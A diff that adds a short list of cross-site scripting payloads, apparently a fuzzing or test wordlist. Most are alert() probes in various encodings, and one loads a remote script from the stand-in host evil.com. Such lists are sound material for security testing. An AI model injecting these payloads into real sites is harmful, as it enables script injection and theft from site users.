@@ -1,0 +1,10 @@
+<script>alert(1)</script>
+"><script>alert('XSS')</script>
+';alert(String.fromCharCode(88,83,83))//
+<IMG SRC="javascript:alert('XSS');">
+<svg/onload=alert('XSS')>
+"><svg onload=alert(1)>
+"><script src=//evil.com></script>
+<iframe src="javascript:alert('XSS');"></iframe>
+javascript:alert('XSS')
+';alert('XSS')//
